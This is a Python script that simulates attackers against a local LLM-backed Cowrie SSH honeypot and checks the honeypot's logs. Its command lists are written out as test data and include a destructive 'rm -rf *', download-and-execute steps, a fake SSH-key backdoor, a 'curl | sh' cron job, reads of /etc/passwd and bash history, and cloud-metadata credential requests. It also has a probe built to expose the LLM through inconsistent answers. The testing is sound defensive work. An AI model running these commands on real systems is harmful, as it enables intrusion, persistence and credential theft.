#!/usr/bin/env python3
"""Local attacker simulator for the LLM honeypot.

Drives several realistic attacker patterns against ``localhost:2222`` in
parallel, then parses ``var/log/cowrie/cowrie.json`` and reports on
what the honeypot captured.

NOT for production / external use. All payloads are synthetic. The
"download" steps hit ``http://example.com/`` (real, small, public) for
the success path and ``http://169.254.169.254/`` for the SSRF-block
path — both safe.

Usage:
    .venv/bin/cowrie start          # in another terminal, or before this
    .venv/bin/python scripts/attacker_sim.py
"""
from __future__ import annotations

import argparse
import json
import socket
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path

import paramiko


# ----------------------------------------------------------------------
# Pattern catalog


@dataclass
class Pattern:
    name: str
    username: str
    password: str
    commands: list[str]
    # Optional per-command sleep — some attackers go fast (botnets), some slow
    # (manual recon). The honeypot's behavior should be the same.
    pace_seconds: float = 0.05


MIRAI_LIKE = Pattern(
    name="mirai_like",
    username="root",
    # Cowrie's default userdb rejects "root" and "123456"; xc3511 is a
    # real Mirai-family weak password that passes the default policy.
    password="xc3511",
    commands=[
        "enable",
        "system",
        "shell",
        "sh",
        "/bin/busybox MIRAI",
        "cat /proc/mounts",
        "cat /bin/echo",
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *",
        "wget http://example.com/ -O /tmp/.x",
        "chmod 777 /tmp/.x",
        "./tmp/.x; rm -rf /tmp/.x",
    ],
    pace_seconds=0.02,  # botnets are fast
)

GENERIC_BRUTE_FOLLOWUP = Pattern(
    name="generic_brute_followup",
    username="admin",
    password="admin",
    commands=[
        "uname -a",
        "id",
        "w",
        "last -10",
        "exit",
    ],
)

MANUAL_RECON = Pattern(
    name="manual_recon",
    username="root",
    password="toor",
    commands=[
        "whoami",
        "id",
        "uname -a",
        "cat /etc/os-release",
        "cat /etc/passwd",
        "ls -la /home",
        "ls -la /root",
        "cat /root/.bash_history",
        "history",
        "find / -perm -4000 -type f 2>/dev/null | head -20",
        "ss -tulpn",
        "ps auxf | head",
    ],
    pace_seconds=0.5,  # manual operator types slowly
)

PERSISTENCE_ATTEMPT = Pattern(
    name="persistence_attempt",
    username="root",
    password="hunter2",  # 123456 is in the default deny list
    commands=[
        "mkdir -p /root/.ssh",
        "echo 'ssh-ed25519 AAAAFAKEKEY attacker@evil' >> /root/.ssh/authorized_keys",
        "chmod 600 /root/.ssh/authorized_keys",
        "cat /root/.ssh/authorized_keys",
        "crontab -l",
        "echo '* * * * * curl -s http://example.com/ | sh' | crontab -",
        "crontab -l",
    ],
)

FINGERPRINT_PROBE = Pattern(
    # The smartest adversary — designed to break the LLM via consistency.
    name="fingerprint_probe",
    username="root",
    password="password",
    commands=[
        "uname -a",
        "cat /etc/os-release",
        "cat /etc/issue",
        "cat /proc/version",
        "cat /proc/cpuinfo | grep -m1 'model name'",
        "free -m | head -2",
        "uptime",
        "lsb_release -a",
        "dpkg --version",
        # Now repeat — values must agree with the first round
        "uname -r",
        "cat /etc/os-release | head -3",
        "free -m | head -2",
    ],
    pace_seconds=0.1,
)

SSRF_PROBE = Pattern(
    # Validates the SSRF gate fires — attacker tries to exfil cloud metadata.
    name="ssrf_probe",
    username="root",
    password="admin",
    commands=[
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "wget -O /tmp/m http://169.254.169.254/computeMetadata/v1/instance/",
        "curl http://10.0.0.1/admin",
        # Then a real fetch to ensure not everything is blocked.
        "curl -o /tmp/ok http://example.com/",
        "ls -la /tmp",
    ],
)


PATTERNS = [
    MIRAI_LIKE,
    GENERIC_BRUTE_FOLLOWUP,
    MANUAL_RECON,
    PERSISTENCE_ATTEMPT,
    FINGERPRINT_PROBE,
    SSRF_PROBE,
]


# ----------------------------------------------------------------------
# SSH driver


@dataclass
class SessionResult:
    pattern: str
    src_port: int
    auth_ok: bool
    commands_sent: int = 0
    output_chunks: list[tuple[str, str]] = field(default_factory=list)
    error: str | None = None


def run_pattern(pattern: Pattern, host: str, port: int) -> SessionResult:
    """Connect, auth, run all commands, collect output."""
    result = SessionResult(pattern=pattern.name, src_port=0, auth_ok=False)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port,
            username=pattern.username, password=pattern.password,
            allow_agent=False, look_for_keys=False, timeout=15,
        )
        transport = client.get_transport()
        if transport is None:
            result.error = "no transport after connect"
            return result
        # Capture local port — useful to correlate with cowrie session id.
        try:
            result.src_port = transport.sock.getsockname()[1]
        except Exception:
            pass
        result.auth_ok = True

        shell = client.invoke_shell(term="xterm", width=120, height=40)
        # Drain the welcome banner.
        time.sleep(0.5)
        while shell.recv_ready():
            shell.recv(8192)

        for cmd in pattern.commands:
            shell.send((cmd + "\n").encode())
            result.commands_sent += 1
            # Wait for response. LLM call adds 0.5-2s typically.
            deadline = time.time() + 8.0
            buf = b""
            while time.time() < deadline:
                if shell.recv_ready():
                    chunk = shell.recv(8192)
                    if not chunk:
                        break
                    buf += chunk
                    # Heuristic: stop when we see another prompt.
                    if b"# " in buf[-4:] or b"$ " in buf[-4:]:
                        time.sleep(pattern.pace_seconds)
                        break
                else:
                    time.sleep(0.1)
            result.output_chunks.append(
                (cmd, buf.decode("utf-8", errors="replace"))
            )

        try:
            shell.send(b"exit\n")
            time.sleep(0.3)
        except Exception:
            pass
    except paramiko.AuthenticationException:
        result.error = "auth failed"
    except (paramiko.SSHException, socket.error, EOFError) as e:
        result.error = f"ssh error: {e}"
    finally:
        try:
            client.close()
        except Exception:
            pass
    return result


def run_parallel(patterns: list[Pattern], host: str, port: int) -> list[SessionResult]:
    results: list[SessionResult | None] = [None] * len(patterns)

    def worker(idx: int) -> None:
        results[idx] = run_pattern(patterns[idx], host, port)

    threads = [threading.Thread(target=worker, args=(i,))
               for i in range(len(patterns))]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return [r for r in results if r is not None]


# ----------------------------------------------------------------------
# Verification


def verify(results: list[SessionResult], json_log: Path) -> dict:
    """Parse cowrie.json for our test window and assert expected events.

    Returns a per-pattern report dict. We use src_port (recorded above)
    to correlate sessions in the JSON log — each Cowrie connect event
    carries src_ip + src_port so we can match a session by tuple.
    """
    if not json_log.is_file():
        return {"_error": f"no log at {json_log}"}

    # Map src_port -> session id for fast lookup.
    sessions_by_port: dict[int, str] = {}
    events_by_session: dict[str, list[dict]] = {}
    with json_log.open() as f:
        for line in f:
            try:
                e = json.loads(line)
            except json.JSONDecodeError:
                continue
            sid = e.get("session", "")
            if not sid:
                continue
            events_by_session.setdefault(sid, []).append(e)
            if e.get("eventid") == "cowrie.session.connect":
                sport = e.get("src_port")
                if isinstance(sport, int):
                    sessions_by_port[sport] = sid

    report = {}
    for r in results:
        sid = sessions_by_port.get(r.src_port)
        pattern_report: dict = {
            "auth_ok": r.auth_ok,
            "commands_sent": r.commands_sent,
            "src_port": r.src_port,
            "matched_session": sid,
            "error": r.error,
        }
        if sid and sid in events_by_session:
            evs = events_by_session[sid]
            pattern_report["events"] = {
                "total": len(evs),
                "commands_logged": sum(
                    1 for e in evs if e.get("eventid") == "cowrie.command.input"
                ),
                "llm_prompts": sum(
                    1 for e in evs if e.get("eventid") == "cowrie.llm.prompt"
                ),
                "llm_responses": sum(
                    1 for e in evs if e.get("eventid") == "cowrie.llm.response"
                ),
                "file_download_success": sum(
                    1 for e in evs if e.get("eventid") == "cowrie.session.file_download"
                ),
                "file_download_failed": sum(
                    1 for e in evs if e.get("eventid")
                    == "cowrie.session.file_download.failed"
                ),
                "budget_exhausted": sum(
                    1 for e in evs if e.get("eventid")
                    == "cowrie.llm.session_budget_exhausted"
                ),
                "observation_leaks": sum(
                    1 for e in evs if e.get("eventid")
                    == "cowrie.llm.observation_leak"
                ),
            }
        report[r.pattern] = pattern_report
    return report


def render_report(report: dict) -> str:
    lines: list[str] = ["", "=" * 78, "ATTACKER SIM REPORT", "=" * 78]
    for pattern, info in report.items():
        if pattern.startswith("_"):
            continue
        lines.append("")
        lines.append(f"### {pattern}")
        lines.append(
            f"  auth_ok={info['auth_ok']} commands_sent={info['commands_sent']} "
            f"src_port={info['src_port']} sid={(info.get('matched_session') or '?')[:12]}"
        )
        if info.get("error"):
            lines.append(f"  ERROR: {info['error']}")
        evs = info.get("events")
        if evs:
            lines.append(
                f"  events:  cmds={evs['commands_logged']:3d}  "
                f"llm_in={evs['llm_prompts']:3d}  "
                f"llm_out={evs['llm_responses']:3d}  "
                f"dl_ok={evs['file_download_success']:2d}  "
                f"dl_fail={evs['file_download_failed']:2d}  "
                f"budget={evs['budget_exhausted']:2d}  "
                f"leak={evs['observation_leaks']:2d}"
            )
        else:
            lines.append("  (no events matched — session may not have reached log yet)")
    lines.append("")
    return "\n".join(lines)


# ----------------------------------------------------------------------
# Main


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument(
        "--json-log",
        default="var/log/cowrie/cowrie.json",
        help="path to cowrie.json relative to repo root",
    )
    parser.add_argument("--serial", action="store_true",
                        help="run patterns serially (debugging)")
    parser.add_argument("--only", nargs="+", choices=[p.name for p in PATTERNS],
                        help="restrict to named patterns")
    args = parser.parse_args()

    patterns = [p for p in PATTERNS if not args.only or p.name in args.only]
    print(f"Running {len(patterns)} patterns against {args.host}:{args.port} "
          f"{'serial' if args.serial else 'parallel'}...")

    t0 = time.time()
    if args.serial:
        results = [run_pattern(p, args.host, args.port) for p in patterns]
    else:
        results = run_parallel(patterns, args.host, args.port)
    elapsed = time.time() - t0
    print(f"Sessions complete in {elapsed:.1f}s. Waiting 2s for events to flush.")
    time.sleep(2)

    report = verify(results, Path(args.json_log))
    print(render_report(report))

    # Exit code: 1 if any session failed to authenticate or has zero llm prompts
    # (suggests honeypot isn't running or is broken).
    bad = sum(
        1 for r in report.values()
        if isinstance(r, dict) and (not r.get("auth_ok") or (
            r.get("events") and r["events"]["llm_prompts"] == 0
        ))
    )
    sys.exit(1 if bad else 0)


if __name__ == "__main__":
    main()
